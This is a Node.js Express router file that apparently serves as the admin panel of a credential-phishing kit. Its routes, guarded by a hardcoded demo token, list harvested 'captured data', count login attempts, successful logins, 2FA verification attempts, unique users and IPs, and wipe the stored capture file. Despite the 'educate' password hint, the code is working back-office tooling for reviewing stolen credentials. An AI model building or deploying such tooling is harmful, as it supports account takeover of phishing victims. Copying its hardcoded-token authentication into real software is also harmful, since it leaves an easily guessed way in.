const express = require('express');
const router = express.Router();

// Simple authentication middleware
const authenticateAdmin = (req, res, next) => {
  const authHeader = req.headers.authorization;
  const token = authHeader ? authHeader.replace('Bearer ', '') : null;
  
  // For demo, accept 'educate2024' as password
  if (token === 'educate2024') {
    next();
  } else {
    res.status(401).json({
      success: false,
      message: 'Unauthorized - Invalid admin token'
    });
  }
};

// Get all captured data
router.get('/data', authenticateAdmin, (req, res) => {
  try {
    res.status(200).json({
      success: true,
      count: global.capturedData.length,
      data: global.capturedData
    });
  } catch (error) {
    console.error('Admin data fetch error:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to fetch data'
    });
  }
});

// Get stats
router.get('/stats', authenticateAdmin, (req, res) => {
  try {
    const stats = {
      totalCaptured: global.capturedData.length,
      loginAttempts: global.capturedData.filter(d => d.type.includes('LOGIN')).length,
      successfulLogins: global.capturedData.filter(d => d.type === 'LOGIN_SUCCESS').length,
      verificationAttempts: global.capturedData.filter(d => d.type.includes('VERIFICATION')).length,
      uniqueUsers: [...new Set(global.capturedData.map(d => d.identifier).filter(Boolean))].length,
      uniqueIPs: [...new Set(global.capturedData.map(d => d.ip).filter(Boolean))].length,
      twoFAAttempts: global.capturedData.filter(d => d.type.includes('VERIFICATION')).length
    };
    
    res.status(200).json({
      success: true,
      stats
    });
  } catch (error) {
    console.error('Stats error:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to calculate stats'
    });
  }
});

// Clear all data
router.delete('/clear', authenticateAdmin, (req, res) => {
  try {
    const clearedCount = global.capturedData.length;
    global.capturedData = [];
    
    // Also clear the file
    const fs = require('fs');
    const path = require('path');
    const dataFile = path.join(__dirname, '../data/capturedData.json');
    fs.writeFileSync(dataFile, JSON.stringify([], null, 2));
    
    res.status(200).json({
      success: true,
      message: 'All data cleared',
      clearedCount: clearedCount
    });
  } catch (error) {
    console.error('Clear data error:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to clear data'
    });
  }
});

module.exports = router;